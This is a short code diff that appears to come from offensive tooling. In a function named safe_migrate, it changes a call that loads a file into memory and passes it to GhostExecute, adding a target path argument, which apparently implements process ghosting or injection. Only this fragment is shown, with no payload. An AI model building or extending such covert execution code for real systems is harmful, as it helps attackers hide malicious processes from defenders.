@@ -86,7 +86,7 @@ bool safe_migrate() {
         API.ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
         API.CloseHandle(hFile);
 
-        NTSTATUS status = GhostExecute(buf, (SIZE_T)fileSize);
+        NTSTATUS status = GhostExecute(buf, (SIZE_T)fileSize, target_path);
         API.RtlFreeHeap(API.GetProcessHeap(), 0, buf);
 
         return (status == 0);
